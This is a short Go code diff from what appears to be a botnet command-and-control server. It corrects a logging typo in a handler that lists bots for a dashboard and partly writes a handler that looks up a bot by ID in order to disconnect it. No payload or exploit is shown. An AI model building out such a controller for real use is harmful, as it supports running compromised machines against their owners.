@@ -156,11 +156,22 @@ func (c *c2) ListBots(w http.ResponseWriter, r *http.Request) {
 		log.Println("Error sending list of bots : ", err)
 		return
 	}
-	log,println("List of bots send to dashboard.")
+	log.Println("List of bots send to dashboard.")
 }
 
 func (c *c2) DisconnectBot(w http.ResponseWriter, r *http.Request) {
-	//todo
+	botID, err := strconv.Atoi(r.PathValue("botid"))
+	if err != nil {
+		log.Println("Error converting botid type string to int", err)
+		return
+	}
+	bot := c.getBot(botID)
+
+	if bot == nil {
+		log.Println("Bot with id: ", botID, "Dosent Exist")
+		return
+	}
+
 }
 
 func main() {
